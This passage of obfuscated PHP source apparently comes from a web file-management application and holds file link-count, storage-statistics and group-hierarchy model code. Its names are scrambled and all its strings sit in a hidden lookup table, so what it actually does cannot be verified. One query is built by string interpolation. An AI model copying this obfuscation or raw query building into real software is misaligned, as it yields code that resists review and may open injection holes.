=> $Õ³¨ÄÖñ); $this->where(array($Çìá½¢”[478] => $¢á¶ââ [$Çìá½¢”[477]]))->save($Ì¼ì®‹¨); return $¢á¶ââ ; } public function remove($„ìéòŒŸ) { $this->linkCountChange($„ìéòŒŸ, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÉéÖÒì‡) { $this->linkCountChange($ÉéÖÒì‡, !0); } public function linkCountChange($ìîï¥Æø, $À„«†œ) { $º§®°…  =& $_SERVER[Ó¡Ÿ§‚]; if (!$ìîï¥Æø) { return; } if (!is_array($ìîï¥Æø)) { $ìîï¥Æø = array($ìîï¥Æø); } $ê¹õÕ¥ä = array(); foreach ($ìîï¥Æø as $ìóç’Ø¼) { $¿Ô™•™¾ = $ìóç’Ø¼ . $º§®°… [12]; if (!$ê¹õÕ¥ä[$¿Ô™•™¾]) { $ê¹õÕ¥ä[$¿Ô™•™¾] = 0; } $ê¹õÕ¥ä[$¿Ô™•™¾]++; } $âÌ—öÂ = array(); foreach ($ê¹õÕ¥ä as $ìóç’Ø¼ => $‚°µà™´) { $¿Ô™•™¾ = $‚°µà™´ . $º§®°… [12]; if (!$âÌ—öÂ[$¿Ô™•™¾]) { $âÌ—öÂ[$¿Ô™•™¾] = array(); } $âÌ—öÂ[$¿Ô™•™¾][] = $ìóç’Ø¼; } foreach ($âÌ—öÂ as $‚°µà™´ => $ñå•…Üö) { if (!$ñå•…Üö) { continue; } $‚°µà™´ = $À„«†œ ? $‚°µà™´ : -intval($‚°µà™´); $ËÅµêÀâ = array($º§®°… [477] => array($º§®°… [7], $ñå•…Üö)); if ($‚°µà™´ < 0) { $ËÅµêÀâ[$º§®°… [1922]] = array($º§®°… [1014], abs($‚°µà™´)); } $this->where($ËÅµêÀâ)->setAdd($º§®°… [1922], $‚°µà™´); } } public function findByHash($ŠÒµ˜ï•, $µÃğËöÀ = false) { $¬ŠÚ¦‚Õ =& $_SERVER[Ó¡Ÿ§‚]; if (!$ŠÒµ˜ï• && !$µÃğËöÀ) { return !1; } $ À¤ü²§ = array($¬ŠÚ¦‚Õ[1916] => $ŠÒµ˜ï•); if ($µÃğËöÀ) { $ À¤ü²§ = array($¬ŠÚ¦‚Õ[1917] => $µÃğËöÀ); } return $this->order($¬ŠÚ¦‚Õ[1923])->where($ À¤ü²§)->find(); } public function clearEmpty($Ïâ‹†í’ = 0) { $ÔŞÂ½Ÿ© =& $_SERVER[Ó¡Ÿ§‚]; $»ãáÖÇ = time() - 3600 * 24 * $Ïâ‹†í’; $€šÁ¨¼› = $ÔŞÂ½Ÿ©[1924] . $»ãáÖÇ; $¯ŞíŞÍï = $this->where($€šÁ¨¼›)->select(); if (!$¯ŞíŞÍï) { return; } $øóÕšŠ­ = new Task($ÔŞÂ½Ÿ©[1925], $ÔŞÂ½Ÿ©[12], count($¯ŞíŞÍï)); foreach ($¯ŞíŞÍï as $›ÖŠ‚ğŠ) { $øóÕšŠ­->update(1); $this->resetFile($›ÖŠ‚ğŠ); } $øóÕšŠ­->end(); } public function resetFile($ÛÌ”Ôæ) { $È˜§ŠŸ =& $_SERVER[Ó¡Ÿ§‚]; $ÃŞ‡Àë¦ = array($È˜§ŠŸ[478] => $ÛÌ”Ôæ[$È˜§ŠŸ[477]]); $ÊÄ´ĞĞ« = Model($È˜§ŠŸ[1338])->where($ÃŞ‡Àë¦)->count(); $¥õ˜‚©Œ = Model($È˜§ŠŸ[1926])->where($ÃŞ‡Àë¦)->count(); $û˜ş†ÍÕ = intval($ÊÄ´ĞĞ«) + intval($¥õ˜‚©Œ); if ($û˜ş†ÍÕ == 0) { IO::remove($ÛÌ”Ôæ[$È˜§ŠŸ[84]]); Model($È˜§ŠŸ[1927])->delete($ÛÌ”Ôæ[$È˜§ŠŸ[477]]); $this->where($ÃŞ‡Àë¦)->delete(); $this->metaSet($ÛÌ”Ôæ[$È˜§ŠŸ[477]], null, null); return; } if ($ÛÌ”Ôæ[$È˜§ŠŸ[1922]] != $û˜ş†ÍÕ) { $this->where($ÃŞ‡Àë¦)->save(array($È˜§ŠŸ[1915] => $û˜ş†ÍÕ)); } } public function storageInfo($•ˆ’ÁÔ² = false) { $Æ’Ğ—  =& $_SERVER[Ó¡Ÿ§‚]; $ÙË­ñ­ = $this->count() + 0.0; $³ıßÇ¸÷ = 0; $“·âœ¬Š = 1; $ÔÍÈÛÎ¿ = 0; $Ø¨¥êâ† = 5000; for ($ßĞ†¼©¥ = 0; $ßĞ†¼©¥ < $ÙË­ñ­; $ßĞ†¼©¥ = $ßĞ†¼©¥ + $Ø¨¥êâ†) { $¦„Ù÷Ÿ = $this->limit($ßĞ†¼©¥, $ßĞ†¼©¥ + $Ø¨¥êâ†)->select(); foreach ($¦„Ù÷Ÿ as $ä‡şãî¢) { $“·âœ¬Š += $ä‡şãî¢[$Æ’Ğ— [76]] * $ä‡şãî¢[$Æ’Ğ— [1922]]; $³ıßÇ¸÷ += $ä‡şãî¢[$Æ’Ğ— [76]] * ($ä‡şãî¢[$Æ’Ğ— [1922]] - 1); $ÔÍÈÛÎ¿ += $ä‡şãî¢[$Æ’Ğ— [1922]]; } } $õÒöË¾ = array($Æ’Ğ— [1928] => $“·âœ¬Š, $Æ’Ğ— [1929] => $³ıßÇ¸÷, $Æ’Ğ— [1930] => $³ıßÇ¸÷ / $“·âœ¬Š, $Æ’Ğ— [80] => $ÙË­ñ­, $Æ’Ğ— [1931] => $ÔÍÈÛÎ¿); return $õÒöË¾; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\141\x6d\x65" => "\147\x72\157\165\160\x5f\x6d\145\164\141", "\x6d\145\164\x61\x46\151\145\x6c\144" => "\x67\162\x6f\165\x70\111\104"); protected function cacheFunctionAlias($ÌÙÅ¬Ãè) { $ĞÑï§ä¦ =& $_SERVER[Ó¡Ÿ§‚]; return array($ĞÑï§ä¦[1932] => array($ÌÙÅ¬Ãè[0], $ĞÑï§ä¦[1933]), $ĞÑï§ä¦[1934] => array($ÌÙÅ¬Ãè[0], $ĞÑï§ä¦[1935])); } protected function getInfo($µÒ«‚µø, $ã¤€÷Í¾ = false) { $êËÃ–½ = $this->getInfoSimple($µÒ«‚µø); if (!$êËÃ–½) { return !1; } if ($ã¤€÷Í¾) { return $this->_listDataApplyItem($êËÃ–½); } return $this->cacheFunctionGet($_SERVER[Ó¡Ÿ§‚][1936], $µÒ«‚µø); } protected function getInfoSimple($æÌÊ® §, $ğê¦ÍÔã = false) { $ªõÒæÔ“ =& $_SERVER[Ó¡Ÿ§‚]; if ($ğê¦ÍÔã) { $“ãã“¢ = array($ªõÒæÔ“[1854] => intval($æÌÊ® §)); $˜íä¤• = $this->where($“ãã“¢)->find(); return is_array($˜íä¤•) ? $˜íä¤• : array(); } return $this->cacheFunctionGet($ªõÒæÔ“[1937], $æÌÊ® §); } protected function groupAdd($ÄÑÂôˆ®) { $Â›ôò®Î =& $_SERVER[Ó¡Ÿ§‚]; if (!$ÄÑÂôˆ®[$Â›ôò®Î[441]] && isset($ÄÑÂôˆ®[$Â›ôò®Î[1854]]) && $ÄÑÂôˆ®[$Â›ôò®Î[1854]] == 1) { if ($ÃíùÇÑ = $this->getInfoSimple($ÄÑÂôˆ®[$Â›ôò®Î[1854]], !0)) { return $ÄÑÂôˆ®[$Â›ôò®Î[1854]]; } } else { $ÃíùÇÑ = $this->getInfoSimple($ÄÑÂôˆ®[$Â›ôò®Î[441]]); if (!$ÃíùÇÑ) { return !1; } } $ÈÈ‹ÔÁğ = $Â›ôò®Î[530]; if ($ÃíùÇÑ[$Â›ôò®Î[520]]) { $ÈÈ‹ÔÁğ = $ÃíùÇÑ[$Â›ôò®Î[520]] . $ÃíùÇÑ[$Â›ôò®Î[1854]] . $Â›ôò®Î[50]; } $“¹£¢¼ = array($Â›ôò®Î[429] => $this->groupNameAuto($ÄÑÂôˆ®[$Â›ôò®Î[441]], $ÄÑÂôˆ®[$Â›ôò®Î[32]]), $Â›ôò®Î[410] => $ÄÑÂôˆ®[$Â›ôò®Î[441]], $Â›ôò®Î[589] => $ÈÈ‹ÔÁğ, $Â›ôò®Î[1938] => $ÄÑÂôˆ®[$Â›ôò®Î[1841]], $Â›ôò®Î[1939] => 0, $Â›ôò®Î[1858] => 0); if (isset($ÄÑÂôˆ®[$Â›ôò®Î[1878]])) { $“¹£¢¼[$Â›ôò®Î[1878]] = $ÄÑÂôˆ®[$Â›ôò®Î[1878]]; } else { $ëÀğìÏ = $this->max($Â›ôò®Î[1878]); if (!$ëÀğìÏ) { $ëÀğìÏ = 0; } $“¹£¢¼[$Â›ôò®Î[1878]] = $ëÀğìÏ + 1; } if (!empty($ÄÑÂôˆ®[$Â›ôò®Î[1854]])) { $“¹£¢¼[$Â›ôò®Î[1854]] = $ÄÑÂôˆ®[$Â›ôò®Î[1854]]; } $Õ§‰È¬ı = $this->add($“¹£¢¼); $this->setNamePinyin($Õ§‰È¬ı, $“¹£¢¼[$Â›ôò®Î[32]]); if (isset($ÄÑÂôˆ®[$Â›ôò®Î[1940]])) { $this->metaSet($Õ§‰È¬ı, array($Â›ôò®Î[1940] => $ÄÑÂôˆ®[$Â›ôò®Î[1940]], $Â›ôò®Î[1941] => $ÄÑÂôˆ®[$Â›ôò®Î[1941]])); unset($ÄÑÂôˆ®[$Â›ôò®Î[1940]]); unset($ÄÑÂôˆ®[$Â›ôò®Î[1941]]); } Model($Â›ôò®Î[1338])->groupRootAdd($Õ§‰È¬ı); return $Õ§‰È¬ı; } protected function groupEdit($µ¾ŞÇİå, $é•‡ËŸ) { $ÚÑ—™¤İ =& $_SERVER[Ó¡Ÿ§‚]; $¦ä¢‰Ö÷ = $this->getInfoSimple($µ¾ŞÇİå); if (!$¦ä¢‰Ö÷) { return !1; } if (!empty($é•‡ËŸ[$ÚÑ—™¤İ[441]])) { $½›«¦â½ = $this->getInfoSimple($é•‡ËŸ[$ÚÑ—™¤İ[441]]); if (!$½›«¦â½) { return !1; } if ($¦ä¢‰Ö÷[$ÚÑ—™¤İ[1854]] == $½›«¦â½[$ÚÑ—™¤İ[1854]]) { return !1; } if ($é•‡ËŸ[$ÚÑ—™¤İ[441]] != $¦ä¢‰Ö÷[$ÚÑ—™¤İ[441]]) { if ($½›«¦â½[$ÚÑ—™¤İ[520]] !== $¦ä¢‰Ö÷[$ÚÑ—™¤İ[520]] && strpos($½›«¦â½[$ÚÑ—™¤İ[520]], $¦ä¢‰Ö÷[$ÚÑ—™¤İ[520]] . $¦ä¢‰Ö÷[$ÚÑ—™¤İ[1854]] . $ÚÑ—™¤İ[50]) === 0) { return !1; } $é•‡ËŸ[$ÚÑ—™¤İ[589]] = $½›«¦â½[$ÚÑ—™¤İ[520]] . $é•‡ËŸ[$ÚÑ—™¤İ[441]] . $ÚÑ—™¤İ[50]; $this->_changeChildLevel($¦ä¢‰Ö÷, $½›«¦â½); } } if (isset($é•‡ËŸ[$ÚÑ—™¤İ[32]])) { $this->setNamePinyin($µ¾ŞÇİå, $é•‡ËŸ[$ÚÑ—™¤İ[32]]); } if (isset($é•‡ËŸ[$ÚÑ—™¤İ[1940]])) { $this->metaSet($µ¾ŞÇİå, array($ÚÑ—™¤İ[1940] => $é•‡ËŸ[$ÚÑ—™¤İ[1940]], $ÚÑ—™¤İ[1941] => $é•‡ËŸ[$ÚÑ—™¤İ[1941]])); unset($é•‡ËŸ[$ÚÑ—™¤İ[1940]]); unset($é•‡ËŸ[$ÚÑ—™¤İ[1941]]); } $this->_clearChildrenCache($¦ä¢‰Ö÷); return $this->where(array($ÚÑ—™¤İ[1942] => $µ¾ŞÇİå))->save($é•‡ËŸ); } private function _clearChildrenCache($²íœíÏ) { $ÈÂ£Ôœü =& $_SERVER[Ó¡Ÿ§‚]; $ÉâÒÈñõ = array($ÈÂ£Ôœü[589] => array($ÈÂ£Ôœü[549], $²íœíÏ[$ÈÂ£Ôœü[520]] . $²íœíÏ[$ÈÂ£Ôœü[1854]] . $ÈÂ£Ôœü[550])); $¤ßÜ³ìÜ = $this->field($ÈÂ£Ôœü[1854])->where($ÉâÒÈñõ)->select(); foreach ($¤ßÜ³ìÜ as $¤‘ÅÑÇ¥) { $this->_clearCache($¤‘ÅÑÇ¥[$ÈÂ£Ôœü[1854]]); } } private function _clearCache($ìÁ¸¬É) { $æ›˜ûÍ‰ =& $_SERVER[Ó¡Ÿ§‚]; $this->cacheFunctionClear($æ›˜ûÍ‰[1936], $ìÁ¸¬É); $this->cacheFunctionClear($æ›˜ûÍ‰[1937], $ìÁ¸¬É); } private function _changeChildLevel($¸§ù¤ïù, $›øäœÆË, $¸Œ¨ëÓÙ = false) { $È¤Ã¿ˆ¦ =& $_SERVER[Ó¡Ÿ§‚]; $ô‘—Í¹ = $¸§ù¤ïù[$È¤Ã¿ˆ¦[520]] . $¸§ù¤ïù[$È¤Ã¿ˆ¦[1854]] . $È¤Ã¿ˆ¦[50]; $÷¢´×÷ = $›øäœÆË[$È¤Ã¿ˆ¦[520]] . $›øäœÆË[$È¤Ã¿ˆ¦[1854]] . $È¤Ã¿ˆ¦[50] . $¸§ù¤ïù[$È¤Ã¿ˆ¦[1854]] . $È¤Ã¿ˆ¦[50]; if ($¸Œ¨ëÓÙ) { $÷¢´×÷ = $›øäœÆË[$È¤Ã¿ˆ¦[520]] . $›øäœÆË[$È¤Ã¿ˆ¦[1854]] . $È¤Ã¿ˆ¦[50]; } $®®½§í‘ = array($È¤Ã¿ˆ¦[589] => array($È¤Ã¿ˆ¦[549], $¸§ù¤ïù[$È¤Ã¿ˆ¦[520]] . $¸§ù¤ïù[$È¤Ã¿ˆ¦[1854]] . $È¤Ã¿ˆ¦[550])); $÷Í«¶ñŒ = array($È¤Ã¿ˆ¦[589] => array($È¤Ã¿ˆ¦[598], "\162\145\x70\x6c\x61\143\145\x28\160\141\x72\x65\x6e\164\114\145\166\x65\x6c\54\47{$ô‘—Í¹}\x27\x2c\47{$÷¢´×÷}\x27\51")); $this->_clearChildrenCache($¸§ù¤ïù); $this->where($®®½§í‘)->data($÷Í«¶ñŒ)->save(); } public function setNamePinyin($Ö²ÔÃŒ, $†÷ø‹ÁÎ = false) { $ÃŸÇá´¸ =& $_SERVER[Ó¡Ÿ§‚]; if (!$†÷ø‹ÁÎ) { $Òƒ™™ÕÜ = $this->getInfoSimple($Ö²ÔÃŒ); $†÷ø‹ÁÎ = $Òƒ™™ÕÜ[$ÃŸÇá´¸[32]]; } if (!Input::check($†÷ø‹ÁÎ, $ÃŸÇá´¸[592])) { $this->metaSet($Ö²ÔÃŒ, $ÃŸÇá´¸[474], null); $this->metaSet($Ö²ÔÃŒ, $ÃŸÇá´¸[473], null); return; } $Ü¦¸¨Å = array($ÃŸÇá´¸[474] => str_replace($ÃŸÇá´¸[53], $ÃŸÇá´¸[12], Pinyin::get($†÷ø‹ÁÎ)), $ÃŸÇá´¸[473] => Pinyin::get($†÷ø‹ÁÎ, $ÃŸÇá´¸[593])); $this->metaSet($Ö²ÔÃŒ, $Ü¦¸¨Å); } protected function groupStatus($”¬Í‹‰“, $ë»¶åÔ¶) { $Ğ¼÷ã =& $_SERVER[Ó¡Ÿ§‚]; $§ù­¤úç = $this->getInfoSimple($”¬Í‹‰“); if (!$§ù­¤úç) { return !1; } if ($ë»¶åÔ¶ == $Ğ¼÷ã[88]) { $½æñıØ† = $this->parentLevelArray($§ù­¤úç[$Ğ¼÷ã[520]]); } else { $ò§Òçí– = array($Ğ¼÷ã[589] => array($Ğ¼÷ã[549], $§ù­¤úç[$Ğ¼÷ã[520]] . $§ù­¤úç[$Ğ¼÷ã[1854]] . $Ğ¼÷ã[550])); $½æñıØ† = $this->where($ò§Òçí–)->field($Ğ¼÷ã[1854])->select(); $½æñıØ† = array_to_keyvalue($½æñıØ†, $Ğ¼÷ã[12], $Ğ¼÷ã[1854]); } $½æñıØ†[] = $§ù­¤úç[$Ğ¼÷ã[1854]]; $†¤ü‰÷µ = array(); foreach ($½æñıØ† as $”¬Í‹‰“) { $†¤ü‰÷µ[] = array($Ğ¼÷ã[1854] => $”¬Í‹‰“, $Ğ¼÷ã[94] => $Ğ¼÷ã[748], $Ğ¼÷ã[374] => $ë»¶åÔ¶); $this->_clearCache($”¬Í‹‰“); } return Model($Ğ¼÷ã[1943])->addAll($†¤ü‰÷µ, array(), !0); } protected function groupRemove($ú…ÚÛƒ¨, $ûã´£ªù = false) { $ˆ¹†áæ =& $_SERVER[Ó¡Ÿ§‚]; $ÓÉÆ¹½§ = array($ˆ¹†áæ[1854] => $ú…ÚÛƒ¨); $åèü§£Û = $this->where($ÓÉÆ¹½§)->find(); if (!$åèü§£Û || $åèü§£Û[$ˆ¹†áæ[441]] == 0) { return !1; } if (!$ûã´£ªù) { $š²Ø÷õ = $this->getInfoSimple($åèü§£Û[$ˆ¹†áæ[441]]); $this->_changeChildLevel($åèü§£Û, $š²Ø÷õ, !0); $this->where(array($ˆ¹†áæ[441] => $ú…ÚÛƒ¨))->save(array($ˆ¹†áæ[441] => $åèü§£Û[$ˆ¹†áæ[441]])); } Model($ˆ¹†áæ[1943])->where($ÓÉÆ¹½§)->delete(); Model($ˆ¹†áæ[1944])->where($ÓÉÆ¹½§)->delete(); Model($ˆ¹†áæ[824])->groupRootRemove($ú…ÚÛƒ¨); return $this->where($ÓÉÆ¹½§)->delete(); } protected function groupSort($Š¸â ÌÇ) { $ÂáËú†¡ =& $_SERVER[Ó¡Ÿ§‚]; $ñ¹îÛ¿Õ = array(); foreach ($Š¸â ÌÇ as $Î…Öšº => $ä³™´ïØ) { $ñ¹îÛ¿Õ[] = array($ÂáËú†¡[1854], $ä³™´ïØ, $ÂáËú†¡[1878], $Î…Öšº + 1); } $this->saveAll($ñ¹îÛ¿Õ); } public function listData() { $šÕÖ‘Û• = $this->_makeOrder()->selectPage(50); $this->_listDataApply($šÕÖ‘Û•[$_SERVER[Ó¡Ÿ§‚][369]]); return $šÕÖ‘Û•; } private function _makeOrder($Ü·–¤¿¯ = '') { $Ç†ëÊÇ˜ =& $_SERVER[Ó¡Ÿ§‚]; $Ìù‹Æ¾Ñ = array($Ç†ëÊÇ˜[1854], $Ç†ëÊÇ˜[32], $Ç†ëÊÇ˜[1843], $Ç†ëÊÇ˜[201]); $Â»–Àú  = array($Ç†ëÊÇ˜[459] => $Ç†ëÊÇ˜[460], $Ç†ëÊÇ˜[461] => $Ç†ëÊÇ˜[462]); $…‘æßìÍ = Input::get($Ç†ëÊÇ˜[466], $Ç†ëÊÇ˜[7], $Ç†ëÊÇ˜[1858], $Ìù‹Æ¾Ñ); $Îšš´Ó¬ = Input::get($Ç†ëÊÇ˜[467], $Ç†ëÊÇ˜[7], $Ç†ëÊÇ˜[1945], array($Ç†ëÊÇ˜[1945], $Ç†ëÊÇ˜[461])); $Îšš´Ó¬ = $Â»–Àú [$Îšš´Ó¬]; $Ü·–¤¿¯ = $Ü·–¤¿¯ . "{$…‘æßìÍ}\x20{$Îšš´Ó¬}\x2c\40\147\x72\157\165\x70\111\104\x20\x61\163\143"; return $this->order($Ü·–¤¿¯); } public function listChild($–•­±Ñ) { $ûÃåŸÏœ =& $_SERVER[Ó¡Ÿ§‚]; $„Ä÷ëÙÂ = $this->where(array($ûÃåŸÏœ[441] => $–•­±Ñ))->_makeOrder()->selectPage(200); $this->_listDataApply($„Ä÷ëÙÂ[$ûÃåŸÏœ[369]]); return $„Ä÷ëÙÂ; } public function listChildIds($Ë¡¢ğä) { $²›Òª‚ =& $_SERVER[Ó¡Ÿ§‚]; if (is_string($¼À£‰èñ)) { $Ë¡¢ğä = explode($²›Òª‚[50], $Ë¡¢ğä); } $ÅË¾³ú = $this->where(array($²›Òª‚[1854] => array($²›Òª‚[7], $Ë¡¢ğä)))->field($²›Òª‚[1946])->select(); if (!$ÅË¾³ú) { return !1; } $®ö²ú¹ = array(); foreach ($ÅË¾³ú as $ë‡¿º´Ê) { $®ö²ú¹[] = "\x73\145\154\x65\x63\x74\40\147\x72\157\165\x70\111\x44\40\146\x72\157\155\x20\x60\147\162\157\x75\x70\x60\40\x77\150\x65\x72\x65\x20\160\x61\x72\145\156\x74\114\145\166\x65\154\40\154\151\x6b\145\40\47{$ë‡¿º´Ê[$²›Òª‚[520]]}{$ë‡¿º´Ê[$²›Òª‚[1854]]}\x2c\45\47"; } $®ö²ú¹ = implode($²›Òª‚[1947], $®ö²ú¹); $ÅË¾³ú = $this->query($®ö²ú¹); if (!$ÅË¾³ú) { return array(); } $Ë¡¢ğä = array_to_keyvalue($ÅË¾³ú, $²›Òª‚[12], $²›Òª‚[1854]); return array_unique($Ë¡¢ğä); } public function listByID($ıÉóàÛâ) { $“÷Ù€ãÆ =& $_SERVER[Ó¡Ÿ§‚]; if (!$ıÉóàÛâ) { return array(); } $ıîşÖÕ = array($“÷Ù€ãÆ[1854] => array($“÷Ù€ãÆ[7], $ıÉóàÛâ)); $¦ÔœÆ¶ = $this->where($ıîşÖÕ)->select(); $¦ÔœÆ¶ = array_sort_keep($¦ÔœÆ¶, $“÷Ù€ãÆ[1854], $ıÉóàÛâ); $this->_listDataApply($¦ÔœÆ¶); return $¦ÔœÆ¶; } public function listSearch($óŸƒú¼¼) { $ÔªÀëÆã =& $_SERVER[Ó¡Ÿ§‚]; $ç¾¥ÊÎ‚ = $óŸƒú¼¼[$ÔªÀëÆã[1948]]; $ÙÑ­¢¾ = isset($óŸƒú¼¼[$ÔªÀëÆã[1949]]) ? $óŸƒú¼¼[$ÔªÀëÆã[1949]] : !1; if (!trim($ç¾¥ÊÎ‚)) { return !1; } $ç¾¥ÊÎ‚ = str_replace($ÔªÀëÆã[1950], $ÔªÀëÆã[1951], $ç¾¥ÊÎ‚); $µ‘İÖ—Š = array($ÔªÀëÆã[1854] => array($ÔªÀëÆã[383], "{$ç¾¥ÊÎ‚}\45"), $ÔªÀëÆã[32] => array($ÔªÀëÆã[383], "\x25{$ç¾¥ÊÎ‚}\x25"), $ÔªÀëÆã[999] => $ÔªÀëÆã[1952]); if ($ÙÑ­¢¾) { $ÃÇïš¨ = $this->getInfoSimple($ÙÑ­¢¾); $ØÏï­”‹ = $ÃÇïš¨[$ÔªÀëÆã[520]] . $ÙÑ­¢¾ . $ÔªÀëÆã[550]; $µ‘İÖ—Š = array($µ‘İÖ—Š, array($ÔªÀëÆã[520] => array($ÔªÀëÆã[383], $ØÏï­”‹))); } $µ‘İÖ—Š = $this->parseWhereLike($µ‘İÖ—Š); $¸ÂÁ•Ìì = $this->_makeOrder()->where($µ‘İÖ—Š)->selectPage(20); $¸ÂÁ•Ìì = $¸ÂÁ•Ìì ? $¸ÂÁ•Ìì : array($ÔªÀëÆã[369] => array(), $ÔªÀëÆã[366] => array()); if (!$¸ÂÁ•Ìì || count($¸ÂÁ•Ìì[$ÔªÀëÆã[369]]) < 5 && Input::check($ç¾¥ÊÎ‚, $ÔªÀëÆã[318])) { $¿…õñ– = $this->groupChildrenAll($ÙÑ­¢¾); $åÃ€Š¶¨ = $this->_searchFromMeta($ÔªÀëÆã[473], $ç¾¥ÊÎ‚, 10, $¿…õñ–); $™§Ö¶ä = $this->_searchFromMeta($ÔªÀëÆã[474], $ç¾¥ÊÎ‚, 10, $¿…õñ–); $Óë·² ë = array_merge($åÃ€Š¶¨, $™§Ö¶ä, $¸ÂÁ•Ìì[$ÔªÀëÆã[369]]); $¸ÂÁ•Ìì[$ÔªÀëÆã[369]] = array_unique_by_key($Óë·² ë, $ÔªÀëÆã[1854]); $¸ÂÁ•Ìì[$ÔªÀëÆã[366]][$ÔªÀëÆã[367]] = count($¸ÂÁ•Ìì[$ÔªÀëÆã[369]]); $¸ÂÁ•Ìì[$ÔªÀëÆã[366]][$ÔªÀëÆã[368]] = ceil($¸ÂÁ•Ìì[$ÔªÀëÆã[366]][$ÔªÀëÆã[367]] / $¸ÂÁ•Ìì[$ÔªÀëÆã[366]][$ÔªÀëÆã[363]]); } $this->_listDataApply($¸ÂÁ•Ìì[$ÔªÀëÆã[369]]); return $¸ÂÁ•Ìì; } protected function groupChildrenAll($ß¨Ó©½Ê) { $•ğóÛÑŸ =& $_SERVER[Ó¡Ÿ§‚]; if (!$ß¨Ó©½Ê) { return !1; } if (is_string($ß¨Ó©½Ê)) { $ß¨Ó©½Ê = array($ß¨Ó©½Ê); } $Üú«õ³ = $ß¨Ó©½Ê; foreach ($ß¨Ó©½Ê as $“ŸÊº˜×) { $ışÜÅää = $this->getInfoSimple($“ŸÊº˜×); $–‰Ãöõ’ = array($•ğóÛÑŸ[520] => array($•ğóÛÑŸ[383], $ışÜÅää[$•ğóÛÑŸ[520]] . $“ŸÊº˜× . $•ğóÛÑŸ[550])); $â—Çı¦‚ = $this->field($•ğóÛÑŸ[1854])->where($–‰Ãöõ’)->select(); $Üú«õ³ = array_merge($Üú«õ³, array_to_keyvalue($â—Çı¦‚, $•ğóÛÑŸ[12], $•ğóÛÑŸ[1854])); } return array_unique($Üú«õ³); } private function _searchFromMeta($ŠÄõö®, $÷‡¹çË·, $±ÍÖ“½Ú, $ĞĞÁñ¤±) { $Â®ÕÊõÃ =& $_SERVER[Ó¡Ÿ§‚]; $÷‡¹çË· = strtolower($÷‡¹çË·); $¦»›Ï‚Ò = array($Â®ÕÊõÃ[94] => $ŠÄõö®, $Â®ÕÊõÃ[374] => array($Â®ÕÊõÃ[383], "\x25{$÷‡¹çË·}\x25")); $¦»›Ï‚Ò = $this->parseWhereLike($¦»›Ï‚Ò); if ($ĞĞÁñ¤±) { $¦»›Ï‚Ò[$Â®ÕÊõÃ[1854]] = array($Â®ÕÊõÃ[7], $ĞĞÁñ¤±); } $¯¿¿¿× = Model($Â®ÕÊõÃ[1953])->where($¦»›Ï‚Ò)->limit($±ÍÖ“½Ú)->select(); if (!$¯¿¿¿×) { return array(); } $¯¿¿¿× = array_to_keyvalue($¯¿¿¿×, $Â®ÕÊõÃ[12], $Â®ÕÊõÃ[1854]); $ª¤„†®º = $this->where(array($Â®ÕÊõÃ[1942] => array($Â®ÕÊõÃ[7], $¯¿¿¿×)))->select(); if (!$ª¤„†®º) { return array(); } return $ª¤„†®º; } protected function _listDataApplyItem($æÏŞã) { $ÄÕ«õ¨½ = array($æÏŞã); $this->_listDataApply($ÄÕ«õ¨½); return $ÄÕ«õ¨½[0]; } protected function _listDataApply(&$îÙ²—¢) { $ÏŞ‹ç–Ã =& $_SERVER[Ó¡Ÿ§‚]; if (!$îÙ²—¢) { return; } $—İÉé©Ÿ = array_to_keyvalue($îÙ²—¢, $ÏŞ‹ç–Ã[12], $ÏŞ‹ç–Ã[1854]); $this->_listAppendChildren($îÙ²—¢); $this->_listAppendChildrenMember($îÙ²—¢); $this->_listAppendMeta($îÙ²—¢, $—İÉé©Ÿ); $this->_listAppendParent($îÙ²—¢); $this->_listAppendSourceRoot($îÙ²—¢, $—İÉé©Ÿ); } private function _listAppendChildren(&$Ãµæ“£¡) { $­”ë—¢Ö =& $_SERVER[Ó¡Ÿ§‚]; $’Ìã­Ûô = array_to_keyvalue($Ãµæ“£¡, $­”ë—¢Ö[12], $­”ë—¢Ö[1854]); $ú³ˆâáš = array($­”ë—¢Ö[441] => array($­”ë—¢Ö[7], $’Ìã­Ûô)); $ÅŠËÄ¬ô = array($­”ë—¢Ö[441], $­”ë—¢Ö[1954] => $­”ë—¢Ö[500]); $ùæşŸ÷ = $this->field($ÅŠËÄ¬ô)->where($ú³ˆâáš)->group($­”ë—¢Ö[441])->select(); $âÁæ¥¥õ = array_to_keyvalue($ùæşŸ÷, $­”ë—¢Ö[441], $­”ë—¢Ö[500]); foreach ($Ãµæ“£¡ as &$‰×ÀÙÀ¿) { $ûèıÕù = $‰×ÀÙÀ¿[$­”ë—¢Ö[1854]]; $‰×ÀÙÀ¿[$­”ë—¢Ö[1955]] = isset($âÁæ¥¥õ[$ûèıÕù]) ? intval($âÁæ¥¥õ[$ûèıÕù]) : !1; } unset($‰×ÀÙÀ¿); } private function _listAppendChildrenMember(&$†ÅğİñÊ) { $ûŸÉÑ“Ñ =& $_SERVER[Ó¡Ÿ§‚]; $”È‘ìØ = array_to_keyvalue($†ÅğİñÊ, $ûŸÉÑ“Ñ[12], $ûŸÉÑ“Ñ[1854]); $ÉñÕí¹‹ = array($ûŸÉÑ“Ñ[1854] => array($ûŸÉÑ“Ñ[7], $”È‘ìØ)); $˜àäüÉ = array($ûŸÉÑ“Ñ[1854], $ûŸÉÑ“Ñ[1954] => $ûŸÉÑ“Ñ[500]); $§õÂÒá = Model($ûŸÉÑ“Ñ[1944])->field($˜àäüÉ)->where($ÉñÕí¹‹)->group($ûŸÉÑ“Ñ[1854])->select(); $–ä³±š = array_to_keyvalue($§õÂÒá, $ûŸÉÑ“Ñ[1854], $ûŸÉÑ“Ñ[500]); foreach ($†ÅğİñÊ as &$´·ûœè­) { $ŠÀš¸Û— = $´·ûœè­[$ûŸÉÑ“Ñ[1854]]; $´·ûœè­[$ûŸÉÑ“Ñ[1956]] = isset($–ä³±š[$ŠÀš¸Û—]) ? intval($–ä³±š[$ŠÀš¸Û—]) : !1; } unset($´·ûœè­); } private function _listAppendMeta(&$Ç‹Øı«­, $®¸„•‹…) { $úñ»íÛË =& $_SERVER[Ó¡Ÿ§‚]; $±Œ‡ãó = array($úñ»íÛË[1854] => array($úñ»íÛË[7], $®¸„•‹…)); $æã·å¸µ = Model($úñ»íÛË[1943])->where($±Œ‡ãó)->select(); $æã·å¸µ = array_to_keyvalue_group($æã·å¸µ, $úñ»íÛË[1854]); foreach ($æã·å¸µ as &$ø†üş½Ÿ) { $ø†üş½Ÿ = array_to_keyvalue($ø†üş½Ÿ, $úñ»íÛË[94], $úñ»íÛË[374]); } 